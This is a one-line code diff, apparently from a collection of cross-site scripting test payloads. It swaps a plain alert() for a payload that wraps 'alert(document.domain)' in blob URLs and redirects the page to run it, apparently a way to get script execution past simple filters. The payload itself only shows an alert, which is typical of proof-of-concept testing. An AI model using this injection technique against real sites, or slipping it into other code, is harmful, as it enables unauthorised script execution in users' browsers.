@@ -1,1 +1,1 @@
-alert()
+((()=>{const j=new Blob(["alert(document.domain)"],{type:"application/javascript"});const u=URL.createObjectURL(j);const h=new Blob([`<script src='${u}'><\/script>`],{type:"text/html"});location=URL.createObjectURL(h)})())
